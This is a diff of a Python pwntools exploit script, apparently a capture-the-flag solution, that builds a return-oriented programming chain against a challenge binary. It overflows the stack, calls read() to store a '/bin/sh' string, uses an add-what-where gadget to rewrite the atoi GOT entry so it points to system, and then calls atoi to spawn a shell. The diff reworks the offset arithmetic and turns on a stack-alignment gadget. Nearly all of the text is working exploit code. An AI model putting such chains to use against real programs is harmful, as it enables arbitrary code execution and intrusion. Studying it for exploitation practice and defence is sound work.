@@ -46,8 +46,7 @@ system_offset = libc.sym.system
 read_offset = libc.sym.read
 
 # convert the Python negative integer into its 64-bit two’s complement representation, with the AND
-delta_read = (read_offset - atoi_offset) & 0xffffffffffffffff  
-delta_system_from_read = (system_offset - read_offset) & 0xffffffffffffffff 
+delta_system = (system_offset - atoi_offset) & 0xffffffffffffffff 
 
 # i want to use the add_what_where gadget to add an offset to the atoi GOT entry, so that it points to the sytem call function
 # so that when the prograam calls atoi, in reality atoi@plt will look into atoi@got which is equal to system@got
@@ -66,24 +65,19 @@ r=conn()
 payload = flat(
     b'A' * OFFSET_TO_RIP,
 
-    # write offset into got to make it call read
-    p64(elf.sym.pop_rsi_ret), p64(delta_read),              # offset in rsi
-    p64(elf.sym.pop_rdi_ret), p64(elf.got['atoi']),         # where to write the offset in rdi: in atoi@got
-    p64(elf.sym.add_what_where),
-
-    # read(0, binsh_addr, 8) (with atoi)
+    # read(0, binsh_addr, 8)
     p64(elf.sym.pop_rdi_ret), p64(0),                       # arg1 of read, fd. Read from stdin=0
     p64(elf.sym.pop_rsi_ret), p64(bin_sh_string_addr),      # arg2 of read, buf: address where to put the read string: binsh_addr
     p64(elf.sym.pop_rdx_ret), p64(8),                       # arg3 of read: number of bytes to read, 8
-    p64(ATOI_PLT),                                          
+    p64(elf.plt['read']),                                          
 
     # write offset intto got to make it call system
-    p64(elf.sym.pop_rsi_ret), p64(delta_system_from_read),  # offset in rsi
+    p64(elf.sym.pop_rsi_ret), p64(delta_system),  # offset in rsi
     p64(elf.sym.pop_rdi_ret), p64(elf.got['atoi']),         # where to write the offset in rdi: in atoi@got
     p64(elf.sym.add_what_where),
 
     # system("bin/sh") (with atoi)
-    #p64(elf.sym.ret_gadget),
+    p64(elf.sym.ret_gadget),
     p64(elf.sym.pop_rdi_ret), p64(bin_sh_string_addr),      # system arg 1: the "bin/sh" string, so i pass its address
     p64(ATOI_PLT),                                          
 )
